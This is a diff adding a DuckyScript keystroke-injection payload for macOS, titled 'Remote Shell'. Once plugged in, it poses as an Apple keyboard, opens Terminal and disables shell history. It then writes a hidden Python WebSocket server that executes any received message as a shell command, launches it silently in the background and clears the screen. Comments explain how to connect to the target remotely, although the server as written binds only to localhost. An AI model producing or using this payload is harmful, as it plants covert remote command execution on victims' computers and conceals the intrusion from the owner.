@@ -1,0 +1,61 @@
+REM Creates a hidden directory in the home directory named .phantom_ws.
+REM Navigates into the new directory.
+REM Writes a Python script (server.py) 
+REM This sets up a WebSocket server and allows command execution from received WebSocket messages.
+REM Starts the Python script in the background with nohup, suppressing all output.
+REM Clears the terminal history and exits the terminal.
+
+
+ 
+REM to connect to the shell remotley: 'brew install websocat'
+REM After you've installed websocat, 
+REM you can connect to your WebSocket server like this: 'websocat ws://localhost:8765'
+REM Replace "localhost" with targets I.P. address
+REM Once connected, you can type a command and press Enter to send it. 
+REM The server will execute the command and send back the output.
+REM To shut down the server, use the kill command with the PID  
+REM Replace 12345 with the actual PID from your 'kill 12345'
+
+REM Requirements: Homebrew/python3/websocat
+REM Python 3 and websockets library need to be installed on the systemTerminal 
+REM command 'pip3 install websockets'
+
+
+REM Title: Remote Shell
+REM Author: NARSTY
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Execution
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 500 
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+STRING  mkdir ~/.phantom_ws && cd ~/.phantom_ws
+ENTER
+DELAY 500
+STRING  echo 'import asyncio\nimport websockets\nimport subprocess\n\nasync def execute_command(websocket, path):\n    async for message in websocket:\n        cmd = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n        cmd_output = cmd.stdout.read() + cmd.stderr.read()\n        await websocket.send(cmd_output.decode())\n\nstart_server = websockets.serve(execute_command, "localhost", 8765)\n\nasyncio.get_event_loop().run_until_complete(start_server)\nasyncio.get_event_loop().run_forever()' > server.py
+ENTER
+DELAY 500
+STRING  nohup python3 server.py > /dev/null 2>&1 &
+ENTER
+DELAY 500
+STRING  clear
+ENTER
+
+
